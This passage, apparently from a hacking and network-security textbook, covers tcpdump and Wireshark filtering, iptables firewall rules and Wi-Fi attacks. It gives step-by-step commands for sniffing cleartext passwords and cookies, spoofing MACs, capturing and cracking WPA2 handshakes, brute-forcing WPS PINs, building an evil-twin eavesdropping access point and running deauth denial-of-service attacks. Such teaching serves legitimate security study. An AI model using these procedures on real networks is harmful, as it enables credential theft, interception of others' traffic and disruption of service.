(very verbose), tcpdump will decode all the IP and TCP headers and the user agent (the user agent can
often be used to identify the user).  To get these results, we could write a filter such as:

kali > tcpdump –vv dst port 80

Filter by TCP Flags

What if we wanted to see only the traffic with SYN flags sets on it? We could create a filter like this:

kali > tcpdump ‘tcp[tcpflags]==tcp-syn’

46 | P a g e

Of course, we can create a filter for each of the TCP flags, such as;

kali > tcpdump ‘tcp[tcpflags]==tcp-ack’

kali > tcpdump ‘tcp[tcpflags]==tcp-fin’

kali > tcpdump ‘tcp[tcpflags]==tcp-rst’

kali > tcpdump ‘tcp[tcpflags]==tcp-psh’

kali > tcpdump ‘tcp[tcpflags]==tcp-urg’

Combining Filters

Tcpdump enables us to use filters together using a logical AND (&&) or a logical OR (||). So, if we
wanted to filter for a particular IP address and TCP port 80 we would create a filter such as:

kali > tcpdump host 192.168.0.114 and port 80

We can also use a logical OR, such as:

kali > tcpdump port 80 or port 443

If we want to see all the traffic except that traveling from a particular IP address, we can use the negation
symbol (!) or not.

kali > tcpdump not host 192.168.0.114

Filtering for Passwords and Identifying Artifacts

To filter for passwords in cleartext, we could build a filter for various ports and then use egrep to search
for strings indicating logins or passwords.

kali > tcpdump port 80 or port 21 or port 25 or port 110 or port 143 or port 23 –lA | egrep –i B5
‘pass=|pwd=|log=|login=|user=|username=|pw=|passw=|password=’

Finally, if you want to filter for just the user agent (an identifying signature of the user and their browser)
we could create a filter such as:

kali > tcpdump –vvAls | grep ‘User-Agent’

47 | P a g e

Finally, to filter for just the browser cookies, we can create the following filter.

kali > tcpdump –vvAls | grep ‘Set-Cookie|Host|Cookie:’

tcpdump is a powerful command-line tool for analyzing network traffic with multiple capabilities. Time
invested in learning its BPF-based filtering system is time well invested. As a security admin or hacker,
you may not have access to a GUI on a remote system, and tcpdump is the tool of choice.

Wireshark, the Gold Standard in Sniffers/Network Analyzers

In recent years, Wireshark has become the de-facto standard in sniffers. Formerly known as Ethereal, it is
now part of nearly every network or security admin’s tool chest. Kali has Wireshark built-in, so we can
start Wireshark by simply entering Wireshark in the terminal or using the GUI;  go to Applications-->09
Sniffing and Spoofing>Wireshark.

48 | P a g e

Wireshark now opens and asks you which interface you would like to listen on. If you are using a VM,
select the eth0. Select the wireless adapter if you are using a physical machine with a wireless adapter
(probably wlan0). Usually, you can determine which adapter to select by activity level. The most active
adapter is likely the one you want to use for sniffing.

49 | P a g e

Now, Wireshark begins capturing packets from your network interface and packaging them into the .pcap
format. Pcap is the standard file format for packet capture (you find it used throughout our industry in
such products as Snort, aircrack-ng, and many others)

You see three separate analysis windows in Wireshark. The top window, labeled #1 in the screenshot
below, is known as the Packet List Pane.  You should see color-coded packets moving in real time
through this window.

50 | P a g e

The middle window, labeled #2, is known as the Packet Details Pane. This pane provides us with header
information from the selected packet in Window #1.

Finally, Window #3, Packet Bytes Pane, provides payload information in both the hexadecimal format to
the left and the ASCII format to the right.

Creating Filters in Wireshark

In general, there is way too much information here to do an effective analysis. Packets are flying by,
hundreds or thousands per minute. To use Wireshark effectively, we need to filter the traffic to see only
those packets of interest. Wireshark has a simple filtering language that you should understand to use
effectively and efficiently in any investigation or analysis.

The packets flying by our interface are of many different protocols. Probably the first filter we want to
apply is a protocol filter. Remember, TCP/IP is a suite of protocols, and we probably want to focus our
analysis on just a few.

In the filter window, type "tcp." You notice that it turns green, indicating that your syntax is correct (it
remains pink while your syntax is incorrect). Now, click the arrow button to the far right of the filter
window to apply the filter.

51 | P a g e

When you do, Wireshark filters out all traffic except the TCP traffic. You can do the same for just about
any protocol, such as “http,” “smtp,” "udp,” “dns", and many others. Try out a few and see what traffic is
passing your interface.

If we want to see traffic only from a particular IP address, we can create a filter that only shows traffic
coming or going from that address. We can do that by entering at the filter window:

ip.addr==<IP address>

Note the double equal sign (==) in the Wireshark filter syntax (similar to C assignment operator). A
single “=” does not work in this syntax.

In my case here, I want to see traffic coming or going to IP address 192.168.1.107, so I create a filter like
so:

ip.addr == 192.168.1.107

52 | P a g e

Now, you see only traffic coming or going to that IP address. Now my analysis is narrowed to a single IP
address of interest.

We can also filter traffic by port. If I want to see only TCP traffic destined for port 80, I can create a filter
like that below;

tcp.dstport==80

Note that this filter indicated the protocol (tcp), the direction (dst) and the port (80).

When creating filters, we most often use “==” as the operator in our filter (there are others; see below).
This syntax works fine as long as we are looking for one of the many header fields in the protocol. If we
are looking for strings in the payload, we have to use the "contains" operator. So, if I were looking for
packets with the word “Facebook” in them, we could create a filter like that below.

53 | P a g e

tcp contains facebook

As you can see above, it only found two packets with the word Facebook in the payload, and we can see
the word Facebook in the ASCII display in the #3 pane.

Creating Filters with the Expression Window

If we aren't sure what field we want to filter for or how to create the necessary filter, we can click on the
Expression tab to the far right. This opens the Expression window like below.

54 | P a g e

To the left of this window is the long list of fields available to us to create filters. These are hundreds of
protocols and the protocols’ fields. You can expand a protocol and find all of its fields and select the field
of interest.

The upper right-hand window includes the Relation choices. These include:

Operator

     Description

==

!=

>

<

>=

<=

Equal To

Not Equal To

Greater Than

Less Than

Greater than or Equal To

Less Than or Equal To

contains Protocol or Field Contains a Value

matches Protocol or Text Field Matches a Regular

Expression

We can now create a filter by simply selecting a field in the left window, a relation in the upper right
window, and a value in the lower right window (values are very often 1 or 0, meaning they exist or do
not). For instance, if we want to find all tcp packets with the RST flag set, we would enter:

tcp. flags.rst==1

Following Streams

In some cases, rather than examine all the packets of a particular protocol or traveling to a particular port
or IP, you want to follow a stream of communication. Wireshark enables you to do this with little effort.
This technique can be useful if you are trying to follow, for instance, the conversation of a rogue,
disgruntled employee who is trying to do damage to your network.

To follow a stream, select a packet by clicking on it and then right-click.

55 | P a g e

This opens a pull-down window like that above. Click "Follow" and then "TCP Stream."

This opens a window that includes all the packets and their content in this stream. Note the statistics at the
bottom of the window to the far left (5796 bytes) and the method of displaying the content (ASCII).

56 | P a g e

Statistics

Finally, we may want to gather statistics on our packet capture. This can be particularly useful in creating
a baseline of normal traffic. Click on the Statistics tab at the top of Wireshark, and a pull-down menu
appears. In our case, let's navigate down to the IPv4 Statistics and then All Addresses.

As you can see above, Wireshark has listed every IP address with activity and some basic statistics for
each IP address.

Sniffers, network analyzers, protocol analyzers such as tcpdump and Wireshark are essential
tools for understanding what is taking place on your network. The better you understand how
these tools work and how they can help you analyze your traffic, the better you will be as a
network engineer or hacker. Throughout this book, we will be using these tools to shed some
light on the various protocols we are analyzing.

Exercises

1. Use tcpdump to filter out all traffic not coming or going to your IP address.
2. Connect to hackers-arise.com. Now use Wireshark to filter out any traffic not

coming from the hackers-arise.com web site

3. Use Wirehark to filter for traffic that has the word “hacker” in it.
4. Use netstat to find all the connections to your system

57 | P a g e

Chapter 4
Linux Firewalls

Now that you know a bit about networking and network
packets, it’s probably a good idea to start thinking about
protecting your network. A firewall is one of the key security
measures necessary for a secure network. Linux has a number
of firewalls available to the infosec practitioner that can be

58 | P a g e

crucial to securing their systems without the high cost of commercial systems. It only requires a
bit of knowledge and training.

A firewall is a subsystem on a computer that blocks certain network traffic from going into or
out of a computer. Firewalls can be either software or hardware-based. Hardware-based firewalls
generally are used to protect a network and the computers on it, while a software-based firewall
protects the system hosting it.

Iptables is a flexible firewall utility built for Linux and other *nix-based operating systems. It
uses the command line to setup policy chains to allow or block traffic. When someone tries to
connect to your computer, iptables automatically looks for a rule to match the type of traffic. If it
doesn't find a match, it falls back to the default action.

The iptables firewall was developed by the Netfilter project and has been available as part of the
Linux kernel since January 2001. As iptables has matured over the years, it has developed the
functionality of many of the proprietary commercial firewalls.

Iptables Basics

iptables is made up of some basic structures known as tables, chains, and targets

Let's look at each of these.

Tables

59 | P a g e

Tables are an iptables construct that defines categories of functionality such as packet filtering or
NAT. There are four tables: FILTER, NAT, MANGLE, and RAW. Filter is the default table if
none other is specified. NAT is used to rewrite the source and/or destination of packets.
MANGLE is used for packet alteration, such as modifying the TCP header. RAW is used for
configuring exemptions from connection tracking

Chains

Each table has its own built-in chains, and the user can define their own chains. Chains are lists
of rules within a table. For our purposes here, the most important chains are INPUT, OUTPUT,
and FORWARD.

INPUT

This chain is for packets destined for the local system

OUTPUT

This chain is for packets leaving the local system

FORWARD

This chain is for packets being routed through the local system

MATCH

A MATCH is where a packet meets the condition established by the rule. iptables then processes
the packet according to the action in the rule.

TARGETS

iptables support a set of targets that trigger an action when the packet meets the condition of a
rule. The most important of these are ACCEPT (allow the packet to pass), DROP (drop the
packet), LOG, REJECT (drop the packet and send back an error) and RETURN.

Installing Iptables

Iptables comes installed on nearly every Linux and *nix system, but if for some reason your
system doesn't have iptables tables installed, you can download it from the repository.

kali > sudo apt install iptables

60 | P a g e

Configuring the Default Policy

Before we begin configuring our iptables, we must first decide what will be our default policy. In
other words, what should the firewall do to packets that do not match any rule?

To see the default policy on your policy chains, simply enter;

kali > sudo iptables -L

As you can see in the screenshot above, our chains are all set by default to ACCEPT. Most times,
you will want your system to accept connections by default, but on very secure systems, you may
want to set the default to BLOCK and then write a rule for every type of accepted connection.
This is very secure, but very tedious and maintenance intensive. For now, let's leave the default
policy to ACCEPT.

iptables help

Next, let's look at the help screen for iptables.

kali > sudo iptables -h

61 | P a g e

In the first of these screens, you can see the key options -A, -D, and -L. They are all uppercase,
and they append (-A), delete (-D), and list (-L) the chain, respectively.

62 | P a g e

In the second screen, we can see the options -s -d and -j. These are all lowercase and indicate the
source address, the destination address, and the target, respectively.

Create Some rules

Next, let's create some rules. Let's assume that you want to block any packets coming from IP
address 192.168.1.102. To create this rule, we simply do the following;

-A this appends this rule to the chain

INPUT looks to match packets coming to the local system

-s sets the source address of the packets

-j sets the target in this case, DROP

We can do the same for the entire sub-network by using CIDR notation or 192.168.1.0/24

63 | P a g e

If we want to DROP packets destined for a particular port, we can use the -p option followed by
the protocol (tcp) and the --dport (destination port) followed by the port (ssh).

If we wanted to accept connections to the website www.amazon.com, we could build a rule that
ACCEPTs outgoing connection (OUTPUT) over the TCP protocol (-p tcp) to amazon.com (-d
amazon.com)

kali > sudo iptables -A OUTPUT -p tcp -d amazon.com -j ACCEPT

It's important to note that iptables will do a DNS lookup only at the time of the creation of the
rule. If the IP address changes, the rule will become ineffective. For this reason, it is preferable
to use the IP address of the domain.

If we wanted to block access to any other websites, we could create the following two rules;

kali > sudo iptables -A OUTPUT -p tcp --dport 80 -j DROP

kali > sudo iptables -A OUTPUT -p tcp --dport 443 -j DROP

The order of these rules is critical. iptables will search the rules until it finds a match. This means
that if the last two rules, dropping ports 80 and 443, were placed before the domain rule, the user
would never be able to reach amazon.com as the drop rules would match before reaching the
domain rule.

So when the local system attempts to connect to amazon.com, they are blocked, and the browser
times out, as seen below.

64 | P a g e

Finally, we can view our table by using the -L or list option

To delete a table and start over, we can flush (-F) the table.

kali > sudo iptables -F

65 | P a g e

Now, when we list the table, we can see that we have a clean slate for creating a new table.

Summary

iptables provides the Linux practitioner and cybersecurity professional with a powerful and
flexible firewall. With just a bit of knowledge and practice, they can create an effective firewall
rivaling the more expensive and complex commercial products costing tens of thousands of
dollars.

Exercises

1. Create a firewall that enables you to connect to Hackers-Arise and no other

website on ports 80 and 443
2. Add a rule to block port 445
3. Flush these rules

66 | P a g e

67 | P a g e

Chapter 5
Wi-Fi Networks (802.11)

In our modern digital age, wireless connections are the norm. We
connect to the Internet via Wi-Fi, we connect to our speakers and phone
via Bluetooth, and we connect our phones via cellular service. All are
wireless, and all are susceptible to being hacked. Each of these areas of
hacking would warrant a separate book, but in this chapter, I’ll focus on
some of the best, most recent, and most effective hacks to Wi-Fi (for

68 | P a g e

Bluetooth Hacks, see Chapter 6 and for Cellular Networks, see Chapter 16).

In this chapter, we will explore multiple ways that these wireless technologies can be attacked and
broken. This includes both acquiring the password (PSK) and eavesdropping on Wi-Fi traffic. These
techniques require a bit of sophisticated Linux and Kali skills (see Linux Basics for Hackers) and
patience, but if you have those two elements, you should be successful in cracking nearly any Wi-Fi AP!

Let’s begin with Wi-Fi or 802.11, as it is known to the IEEE. We all know how to work with Wi-Fi, but
few of us understand its inner workings. Understanding a bit about its anatomy will help us in attacking it.

Wi-Fi or 802.11

Wi-Fi is also sometimes referred to as a “Wireless Local Area Network” or WLAN, which basically sums
up what this technology is all about. In technical terms, Wi-Fi (or wireless networking) is known as IEEE
802.11 technologies. Without getting into too much detail, IEEE 802.11 is a set of standards created and
maintained by the Institute of Electrical and Electronics Engineers (IEEE), which are used to implement
WLAN communication in select frequency bands.

Initially,  Wi-Fi  was  secured  with  Wired  Equivalent  Privacy  or  WEP.  This  proved  flawed  and  easily
hacked, so the industry developed WPA as a short-term fix. Eventually, the industry implemented WPA2,
which has proven relatively resilient to attack but does have its flaws. The industry is presently rolling out
WPA3 due to these vulnerabilities in WPA2.

Terminology

This chapter contains a lot of new terminology and acronyms, so let’s pause a moment to review some
terminology.

AP –

PSK -

SSID -

ESSID -

BSSID -

Channels -

Power -

Security -

This is the access point or the place where the clients connect to the Wi-
Fi and get Internet access.

Pre-Shared-Key This is the password used to authenticate to the AP

The name used to identify the AP

(Extended Service Set Identifier) is the same as the SSID but can be used
for multiple APs in a wireless LAN

( Basic Service Set Identifier) this is the unique identifier for every AP.
It’s the same as the MAC address of the AP

Wi-Fi operates on channels 1-14 but is limited to 1-11 in the U.S.

The  closer  you  are  to  the  AP,  the  stronger  the  signal.  The  signal  in  the
U.S is limited to .5 watts by the FCC

This  is  the  security  protocol  to  authenticate  and  encrypt  Wi-Fi  traffic.
The most popular at this time is WPA-PSK

69 | P a g e

Modes -

Range -

Frequency -

Wi-Fi  can  operate  in  three  modes,  master,  managed,  and  monitor.  APs
operate  in  master  mode,  wireless  network  interfaces  operate  in  monitor
mode by default, and hackers usually operate in monitor mode.

At the legal limit of .5 watts, most Wi-Fi APs are accessible up to 300ft
(100m) but with high gain, antennas can be accessible up to 20 miles

Wi-Fi  is  designed  to  operate  at  2.4GHZ  and  5GHZ.  Most  modern
systems now use both.

802.11 Security Protocols

There have been several security protocols to protect and encrypt Wi-Fi, and your strategy will depend
upon which has been implemented.

WEP

The initial security protocol to secure 802.11 was named WEP or Wired Equivalent Privacy. By
2001,  hackers  discovered  that--through  statistical  techniques--they  could  crack  the  user’s
password in minutes due to improperly implemented RC4 encryption. The IEEE had to quickly
find  a  replacement  as  all  the  Wi-Fi  APs  were  left  without  security  at  that  point.  Few  of  these
access points are still in use today.

WPA

In 2003, IEEE created a short-term fix they called Wi-Fi Protected Access or WPA. The key part
of  this  new  security  protocol  was  that  it  did  not  require  replacing  the  existing  hardware,  but
rather it relied upon firmware upgrades. WPA also relied upon the RC4 encryption algorithm but
added  some  additional  features  making  the  PSK  more  difficult  and  time-consuming  to  crack.
These features included

1. Making the Initialization Vector longer from 48 to 128 bits
2. TKIP, which generates different keys for each client
3. Message Integrity Check to make certain the messages have not been altered enroute

WPA2

The WPA2 802.11i standard was finalized in June 2004. WPA2 uses the counter mode with Cipher Block
Chaining Message Authentication Protocol, more commonly known as CCMP. This new protocol was
based upon the Advanced Encryption Standard (AES, see Appendix A for more on Cryptography)
algorithm for authentication and encryption. CCMP was more processor-intensive, so most APs had to be
replaced with more vigorous hardware.

70 | P a g e

WPA2 supports both Personal and Enterprise modes. When using the personal mode (PSK), the pre-
shared key (password) is combined with the SSID to create a pairwise master key (PMK). This was
designed to make a rainbow table password cracking more difficult. The client and the AP exchange
messages using the PMK to create a pairwise transient key (PTK). This key is unique to each user and
session and was designed to make sniffing Wi-Fi traffic more difficult.

Wi-Fi Adapters for Hacking

Although nearly everyone has a Wi-Fi adapter on their laptop or mobile device, these Wi-Fi adapters are
generally inadequate for the attacks I outline here. Wi-Fi hacking requires a specialized Wi-Fi adapter,
one that is capable of injecting frames into a wireless AP. Few
off-the-shelf Wi-Fi adapters can do so.

Aircrack-ng is the most widely used tool for Wi-Fi (many tools
simply put a GUI over aircrack-ng) hacking, and aircrack-ng
maintains a list of Wi-Fi chipsets that are compatible with their
software at https://www.aircrack-
ng.org/doku.php?id=compatible_cards).

I can save you a lot of time and research and simply recommend
the Alfa Wi-Fi cards. I have been using them for years, and they
work flawlessly. They are inexpensive, effective, and efficient. I
will be using the Alfa AWUS036NH throughout this chapter.
You can order your own with a high-gain antenna (not required,
but recommended) from Amazon for less than $40
(https://amzn.to/2PvC1u0).

Before we begin attacking the Wi-Fi, let’s review some commands and concepts we will need to attack
them.

Viewing Wireless Interfaces

First, we need to view our wireless interfaces. You can do this by simply using the ifconfig command
in Linux. This command displays all your networking interfaces.

kali > ifconfig

71 | P a g e

To be more specific and view only the wireless interfaces, you can use the iwconfig command.

kali > iwconfig

As you can see, this command only displays those interfaces with “wireless extensions.”

To view all the Wi-Fi APs within range of your wireless network interface, you can enter iwlist in

Linux.

kali > iwlist

72 | P a g e

This command is capable of detecting all the APs within range and providing you with key information

about each, including:

1.

2.

Its MAC address

Its channel

3. Frequency

4. ESSID

5.

Its Mode

Monitor Mode

Speaking of Wi-Fi mode, Wi-Fi or 802.11 has three modes: master, managed, and monitor.  Monitor

mode is similar to the promiscuous mode in a wired network, where the network device is capable of

picking up all packets passing its way. Generally, in Wi-Fi hacking, you will need your wireless card in

monitor mode. To do so, enter

kali > airmon-ng start wlan0

73 | P a g e

When you enter this command, it places your wireless interface into monitor mode and changes its name.

Here you can see it has changed to wlan0mon.

Also, note that it warns that three processes could cause trouble. Despite this warning, usually, this does

not cause a problem. If it does create a problem, enter:

kali > airmon-ng check kill

Capturing Frames

Next, with our wireless NIC in monitor mode and seeing all the traffic around us, we need to begin to
capture that data. We can do so by using the airodump-ng command in the aircrack-ng suite as so:

kali> airodump-ng wlan0mon

74 | P a g e

Now, we can see all the APs with their critical information in the upper part of the screen and the clients
in the lower part of the screen. All the information we need to attack these APs and clients is available
right here!

Anatomy of Wi-Fi Frames

In this section, we will be examining the Wi-Fi (802.11) protocol anatomy. It's great to know
how to use the tools at our disposal to hack Wi-Fi, but if you want to develop your own tools,
you will need to dig deeper into the Wi-Fi protocol to understand it better.

The tables below enumerate each of the Wi-Fi frame types, their description, and how you can
filter for each type using Wireshark.

75 | P a g e

A Bit of Background of these Different Frame Types

The tables above are a great reference, but let's take a moment to review what each of those
frames does, including their specific Wireshark filter (in italics beneath each description). It's
important to note that tools such as airodump-ng and Kismet are capable of using these frames to
provide you with key information necessary for hacking the AP.

1. An Association request is sent by a station to associate with a BSS.

wlan.fc.type==0x00

2. An Association response is sent in response to an association request

wlan.fc.type==0x01

3. A Reassociation request is sent by a station changing association to another AP in the same
ESS (so roaming between APs, or reassociating with the same AP)

wlan.fc.type==0x02

4. Reassociation response is the response to the reassociation request

wlan.fc.type==0x03

76 | P a g e

5. Probe request is sent by a station in order to “scan” for an SSID (this is how airodump-ng and
other tools find the AP even if the SSID is turned off).

wlan.fc.type==0x04

6. Probe response is sent by each BSS participating to that SSID

wlan.fc.type==0x05

7. Beacon is a periodic frame sent by the AP (or stations in case of IBSS) and gives information
about the BSS

wlan.fc.type==0x08

8. ATIM is the traffic indication map for IBSS (in a BSS, the TIM is included in the beacon)

wlan.fc.type==0x09

9. Disassociation is sent to terminate the association of a station

wlan.fc.type==0x0A

10. Authentication is the frame used to perform the 802.11 authentications (and not any other
type of authentication)

wlan.fc.type==0x0B

11. Deauthentication is the frame terminating the authentication of a station. This frame is often
used in our attack tools to "bump" users off the AP using aireplay-ng or perform a Denial of
Service on the AP.

wlan.fc.type==0x0C

12. Action is a frame meant for sending information elements to other stations (when sending in
a beacon is not possible/best)

wlan.fc.type==0x0D

13. PS-Poll is the Power-save poll frame polling for buffered frames after a wake-up from a
station

wlan.fc.type==0x1A

14. RTS is the request-to-send frame

77 | P a g e

wlan.fc.type==0x1B

15. CTS is the clear-to-send frame (often response to RTS)

wlan.fc.type==0x1C

16. ACK is the acknowledge frame sent to confirm receipt of a frame.

wlan.fc.type==0x1D

17. Data frame is the basic frame containing data

wlan.fc.type==0x20

18. Null frame is a frame meant to contain no data but flag information

wlan.fc.type==0x24

19. QoS (Quality of Service) data is the QoS version of the data frame

wlan.fc.type==0x28

20. QoS (Quality of Service) null is the QoS version of the null frame

wlan.fc.type==0x2C

Wireshark Display Filters for Wi-Fi Frames

To filter for these frames in Wireshark, click on the "Expressions" tab to the right of the filter
window and the following Window will open.

In the Search field near the bottom right, enter "wlan" as seen below.

78 | P a g e

Now, scroll down to the "wlan.fc.subtype" field and click on it. Select the "==" for relation and
then enter the value of the frame type you want to filter for.

79 | P a g e

When trying to develop your own Wi-Fi hacking tools, it is critical to understand the frames and
their purpose in this 802.11 protocol. Bookmark this page for future reference as we use this
information to develop our very own Wi-Fi hacking tools!

Attacking Wi-Fi APs

Hidden SSID’s

Most security engineers are taught to “hide” their SSIDs. The thinking is that by hiding their SSID, only
people who know the SSID will be able to discover and connect to their Wi-Fi AP. Their trust in this
strategy is misplaced.

Whenever a legitimate client tries to connect to an Access Point (AP), both the probe response and
request contain the SSID of the access point. In addition, generally, you do not need the SSID to connect
to the AP, if you have the BSSID (the MAC address) of the AP. As this information is broadcast over the
airwaves, the hacker only needs to use a tool such as airodump-ng or others to view the BSSIDs, as
we saw above.

Defeating MAC Filtering

Again, network security engineers are taught to limit who can access their Wi-Fi AP by using MAC
filtering. This technique limits who can access the AP by MAC address (the globally unique identifier on
every network interface). The security engineer puts the MAC addresses of all the legitimate users and
their systems into the administrator interface of the AP. This means that these MAC addresses are
allowed to connect, and the AP rejects everyone else.  Unfortunately, this technique fails miserably in the
face of some simple techniques.

The hacker can use airodump-ng to find the MAC addresses of clients that have authenticated to the AP.

kali > airodump-ng –c 11 –a –bssid <mac>

Once the hacker knows the MAC address of the authenticated client, they can simply “spoof” that MAC
address. This requires that we take down the interface:

kali> ifconfig wlan0 down

Then, use macchanger to spoof the MAC address making it the same as the connected client’s  MAC.

80 | P a g e

kali > macchanger –m <mac> wlan0

Now, bring back up the interface, and it will have the same MAC address as one of the systems that
allowed it to connect to the AP. Simple!

kali > ifconfig wlan0 up

Once the attacker’s MAC address matches one in the MAC filtering whitelist, they can connect to the AP
without interference.

Attacking WPA2-PSK

WPA2-PSK is the most widely used security protocol among Wi-Fi routers. Although WPA3 has just
been released, it has not yet been widely deployed. As a result, let’s focus on WPA2 cracks.

Unlike some earlier Wi-Fi hacking techniques, such as WEP (where you could crack the password in
minutes using statistical techniques), the strategy with WPA2 is similar to our password-cracking
techniques in Chapter 8. With WPA2-PSK, we first capture the hash of the password, and then we apply a
wordlist in a hash cracking program such as hashcat to find a match.

The key is to grab the password hash as it is transmitted through the air. WPA2-PSK has what is known
as the four-way handshake, where the password hash is transmitted across the air between the client and
the AP. We can capture it there and then apply our familiar techniques and resources for password hash
cracking.

81 | P a g e

WPA2-PSK 4-Way Handshake

The first step is to put our wireless network card in monitor mode.

kali > airmon-ng start wlan0

Then we start airodump-ng to collect information and packets.

kali > airodump-ng wlan0mon

82 | P a g e

We will likely want to focus our packet capture on a single AP on a single channel. We can do that by
entering the following:

kali > airodump-ng –bssid <BSSID of the Target AP> -c <the channel the
AP is transmitting on> --write <file name to save the hash> wlan0mon

If you are impatient like me, you can bump off a client who is already connected to the AP, and then
when they reconnect, you will capture their handshake using aireplay-ng such as;

kali > aireplay-ng –deauth 100 –a AA:BB:CC:DD:EE:FF wlan0mon

83 | P a g e

Where:

aireplay-ng

is the command

--deauth 100

is the option to send 100 deauth frames into the AP

-a <BSSID>

is the BSSID of the target AP

wlan0mon

is your wi-fi adapter in monitor mode

Now, when the client re-authenticates to the AP, airodump-ng will automatically detect the four-way
handshake, capture it and write it to the file you designated (HackersAriseCrack).

When we do a long listing on our working directory, we will find five files created by airodump-ng. The
first one, Hackers-AriseCrack-1.cap contains the hash for cracking.

Now that you have the handshake, you simply need to use a hash cracking program such as hashcat to
brute-force the password. Admittedly, this can be a slow and tedious process, making your selection of a
good wordlist critical.

kali > hashcat –m 16800 HackersAriseCrack-01.cap
/root/top10000passwords.txt

84 | P a g e

If you are at first unsuccessful, create a custom wordlist for the target using ceWL, cup, crunch, or all
three. With this new custom wordlist, try once again to crack the hash with hashcat.

WPS

Many people who buy and use Wi-Fi APs are technically challenged. For them, setting up a Wi-Fi AP is a
daunting task. To remedy this situation, the industry developed a technology to make setting up a Wi-Fi
AP as easy as pushing a button! What could possibly go wrong?

The new technology became known as Wi-Fi Protected Setup or WPS. It enabled the user to setup their
Wi-Fi access point by simply pressing a button on the AP. This system relies upon a PIN being
transmitted between the AP and the client to initiate their “secure” connection.

This PIN uses only digits from 0-9 (no special or alphabetic characters). The PIN is eight characters long
(all characters are digits), and the eighth character is a checksum. To make matters worse--of these seven
remaining characters-- the first four are checked, and the last three are checked, separately. This means
that the number of possibilities is 104 (10,000) + 103 (1000) = 11,000 possible PIN’s! With that small
number of PINs, our computer can test each in a matter of hours.

Although this vulnerability was mitigated with the development of WPS 2.0 in 2012, there are still a
number of APs with WPS 1.0 and vulnerable to this attack (I estimate about 10-20 percent)

The crack the WPS PIN, you will need the following information;

1. The name of your interface (usually wlan0mon)
2. The MAC Address of the AP
3. The ESSID of the AP
4. The channel that the AP is broadcasting on

We can gather all that information from our airodump-ng screen.

85 | P a g e

To find APs with WPS, you can run the wash command followed by the name of your interface
(wlan0mon).

kali > wash –i wlan0mon

As you can see above, there were a number of APs available near my office, and of those, one is still
using WPS 1.0 (NTGR_VMB_1462061001).

Now, with the information from wash and airodump-ng, we can brute force the PIN with either
bully or reaver.

To use bully, enter:

kali > bully wlan0mon –b 00:11:22:33:44:55 –e NTGR_VMB_1462061001–c 11

To use reaver, enter the following:

kali > reaver –i wlan0mon –b 00:11:22:33:44:55 –vv

86 | P a g e

Make certain that you replace the MAC address with the actual MAC address of the target AP, the actual
SSID of the target AP, and the actual channel the AP is broadcasting on.

Evil Twin Attack (MiTM)

Sometimes, rather than attacking the AP password, the attacker wants to view all the target’s traffic. In
other words, the attacker wants to “eavesdrop” on their traffic. Eavesdropping might reveal passwords on
other accounts, credit card numbers, or confidential meetings and plans. One way of doing that is to create
an Evil Twin AP. The Evil Twin is an AP with the same SSID as the target AP. If the attacker can get the
target to connect to their Evil Twin AP, then all the traffic will traverse the attacker’s computer. This
enables the attacker to eavesdrop (listen) to the target’s traffic and even alter the messages.

Build our Evil Twin

Let’s start building our Evil Twin. To do so, we need another tool from the aircrack-ng suite, airbase-
ng. It converts our Wi-Fi adapter into an AP, broadcasting and accepting client connections. We will also
need two network interfaces. Here, I will be using my Alfa card as an AP and Ethernet connection
(eth0) to connect to the Internet.

kali > airbase-ng –a aa:bb:cc:dd:ee:ff --essid hackers-arise –c 6
wlan0mon

Where:

aa:bb:cc:dd:ee:ff

is the MAC address of the new Evil Twin AP

87 | P a g e

--essid hackers-arise

is the name of the Evil Twin AP

-c 6

is the channel we want it to broadcast on

wlan0mon

is the interface we want to use as an AP

Now that we have our wireless card up as an AP let’s check our system again for wireless extensions with
iwconfig.

kali > iwconfig

As you can see, we now have a new wireless interface, at0,  but with no wireless extensions. We need to
fix that.

We need to build a tunnel from at0 to our Ethernet interface (eth0) so that when someone connects to
our AP (at0), their traffic traverses our system and out to the Internet via the eth0. The next set of four
commands does exactly that!

kali > ip link add name ha type bridge

kali > ip link set ha up

kali > ip link set eth0 master ha

kali > ip link set at0 master ha

88 | P a g e

Now that we have built our tunnel, let’s run ifconfig again.

As you can see, we now have a tunnel named ha (hackers-arise) that takes traffic from at0 (our AP) to
our Ethernet connection and out to the Internet. In this way, whenever anyone connects to our AP, their
traffic goes through our system and then out to the Internet totally transparently.

We now need to set up a DHCP server (it assigns IP addresses to those who connect) to the tunnel we
created.

kali > dhclient ha &

This starts the DHCP service (dhclient) on our tunnel (ha) and then puts the service into the
background (&).

To get the clients to connect to our new Evil Twin AP, we need to knock them off the legitimate AP. We
can do this the same way we did above in our WPA2 attack. We use the aireplay-ng command and
send de-authentication frames into the AP (sometimes, this can DoS some of the older AP hardware).
This will make the legitimate AP unavailable to the clients, and they will connect to the Evil Twin
instead!

kali > aireplay-ng –deauth 1000 aa:bb:cc:dd:ee:ff wlan0mon –ignore-
negative-one

Now open Wireshark. When the clients reconnect to your Evil Twin, their traffic traverses unencrypted
through your system. You should be able to view it on Wireshark.

89 | P a g e

Notice that when you open Wireshark, a new interface—our tunnel “ha”—appears in the GUI. Click on
that interface to collect the packets traversing our tunnel.

You can now view all the client’s traffic in Wireshark!

90 | P a g e

To follow a stream of one client, right-click on a packet in the upper window and click on “Follow
Stream.”

Now you should be able to see and read all that client’s traffic!

Denial of Service (DoS) Attack

As we have seen, there is a Wi-Fi protocol frame known as the de-authentication (deauth) frame. It can be
used to knock users off the AP. We used it above to de-authenticate users forcing them to re-authenticate
in the WPA2-PSK attack and knock out the legitimate AP in the Evil Twin hack. We can also use that
frame and aircrack-ng suite to create a Denial of Service (DOS) against the AP.

We can simply use this command to knock users off the AP. As I mentioned earlier, in some older APs,
this will knock out the AP entirely and force the admin to reboot the AP.

To do so, we simply need to enter:

kali > aireplay-ng –deauth 100 –a <BSSID> wlan0mon

91 | P a g e

This will knock everyone off the AP during the duration of the sending of the deauth frames. They can
reconnect then afterward. What if we wanted to keep the AP offline indefinitely? We could keep running
this command over and over again, OR we could summon up our BASH scripting skills (for BASH
scripting, see Linux Basics for Hackers) to create a simple script that kept running this command at
regular intervals.

This simple BASH script periodically sends these de-authenticate (deauth) frames to the AP, thereby
knocking  all the clients off and disrupting their Internet access. Then, we put our attack to “sleep” for a
period of time and restart the attack, knocking everyone off again.

To do so, open Leafpad (MousePad), vim, or any text editor and enter the following;

Line #1 -

declares that this is a BASH script

Line #3 -

starts a for loop starting with one and running through until 5000 iterations

Line #5 -

begins the do

Line #7 -

is our aireplay-ng command that sends the deauth frames to the selected AP BSSID

Line #9 -

puts the script to sleep for sixty seconds

92 | P a g e

Line #11 -

completes the do

